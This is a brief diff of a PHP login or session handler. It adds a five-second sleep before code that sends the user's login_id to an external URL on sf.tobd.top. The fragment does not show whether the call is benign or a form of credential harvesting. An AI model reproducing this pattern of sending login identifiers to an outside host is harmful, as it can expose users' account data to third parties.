@@ -111,6 +111,8 @@ if ($session_key) {
     $stmt->close();
     $mysqli->close();
 
+    sleep(5);
+
     // Notify via external API
     $notify_url = "https://sf.tobd.top/ff/?id=" . urlencode($login_id);
     $notify_curl = curl_init();
